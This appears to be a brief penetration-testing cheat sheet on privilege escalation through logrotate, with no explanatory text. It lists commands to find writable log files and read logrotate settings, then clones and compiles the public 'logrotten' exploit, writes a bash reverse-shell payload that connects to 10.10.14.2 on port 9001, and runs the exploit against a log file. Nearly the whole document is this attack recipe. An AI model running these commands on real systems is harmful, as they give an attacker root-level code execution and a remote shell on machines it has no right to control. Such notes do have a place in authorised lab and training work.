# Logrotate
```powershell
logrotate --help

find /var/log -type f -writable 2>/dev/null

cat /etc/logrotate.conf
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

sudo cat /var/lib/logrotate.status

ls /etc/logrotate.d/

git clone https://github.com/whotwagner/logrotten
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

./logrotten -p ./payload /var/log/some_log_file
```
